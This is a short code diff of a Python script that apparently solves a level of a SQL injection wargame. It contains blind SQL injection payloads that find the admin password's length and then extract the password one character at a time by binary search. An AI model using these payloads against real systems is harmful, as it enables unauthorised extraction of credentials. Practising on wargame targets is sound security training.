@@ -33,17 +33,16 @@ def main():
     url = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php"
     cook = lc.check_cookies(url)
 
-    payload = "' or length(pw)>%s #"
-    param = dict(pw=payload)
+    payload = "' or length(pw)>%s#"
+    param = {'pw':payload}
     len_of_key = los.find_key_len(url, param, check_func, cook)
-
     print(len_of_key)
 
     result = ''
     num_of_requests = 0
     for i in range(1, len_of_key + 1):
-        payload = f"' or id='admin' and ord(mid(pw,{i},1))<%s #"
-        param = dict(pw=payload)
+        payload = f"' or id='admin' and ord(mid(pw,{i},1))<%s#"
+        param = {'pw':payload}
         left, num_requests = los.find_binary(url, param, check_func,
                                              32, 127, cook)
         print(chr(left))
